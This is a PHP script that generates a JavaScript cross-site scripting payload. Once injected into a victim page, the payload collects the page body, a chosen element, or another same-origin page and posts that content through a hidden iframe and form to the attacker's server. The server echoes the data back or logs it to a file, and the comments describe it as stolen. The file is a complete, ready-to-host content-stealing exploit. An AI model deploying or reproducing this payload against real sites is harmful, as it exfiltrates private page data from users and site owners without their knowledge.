<?php
  /*
    Host on a server under your control in order to include as a javascript and have either the current page or a page of your choosing sent back via a POST
    URL arguments to script:
     - (Default) tag = element tag name to grab from current page. Default = "body" 
     - id = id of element to be grabbed from injected page
     - url = url of page to retrieve (within the same origin as the page this script is injected into)

  */
  header( "Content-type: text/javascript" );
  $url = "http://".$_SERVER["SERVER_ADDR"].$_SERVER["PHP_SELF"];
  if( !isset( $_POST["c"] ) ){
    echo "  function xssgetcontent(){\n";

    // Get a URL
    if( !empty( $_GET["url"] ) ){
?>
    x=new XMLHttpRequest();
    x.onreadystatechange = function(){
      if( this.readyState == this.DONE ){
        xsssendcontent(this.responseText);
      }
    }
    x.open('GET','<?php echo $_GET["url"]; ?>' );
    x.send(null)
<?php 
    
    // Get an element by its id
    }elseif( !empty( $_GET["id"] ) ){ 
?>
    xsssendcontent(document.getElementById('<?php echo $_GET["id"]; ?>').outerHTML);
<?php

    // Get elements by tag
    }else{
      if( empty( $_GET["tag"] ) ) $_GET["tag"] = "body";
?>
    var content = '';
    var col = document.getElementsByTagName('<?php echo $_GET["tag"]; ?>');
    for( var i=0; i<col.length; i++ ){ 
      content += col[i].outerHTML + "\n\n"; 
    }
    xsssendcontent(content);
<?php } ?>
  }

  function xsssendcontent(content){
    document.getElementById('xss_content').value = content;
    document.getElementById('form_xss').submit();
  }
  if( !document.getElementById('frame_xss') ){
    frame = document.createElement('iframe');
    frame.style='visibility: hidden;';
    frame.name='frame_xss';
    form = document.createElement('form');
    form.action = '<?php echo $url; ?>'
    form.target = 'frame_xss';
    form.method='POST';
    form.id = 'form_xss';
    e = document.createElement('input');
    e.type = 'hidden';
    e.name = 'c';
    e.id = 'xss_content';
    form.appendChild(e);
    document.getElementsByTagName('body')[0].appendChild(frame);
    document.getElementsByTagName('body')[0].appendChild(form);
  }
  xssgetcontent();
<?php 
  }else{
    
    // Reflect back the content that was stolen. Equally you could dump it to file / database at this point
    echo $_POST["c"];
    
    // Example basic logging to a file
    // file_put_contents( 'contentstealer.log', $_POST["c"]."\n\n", FILE_APPEND );

  }
?>
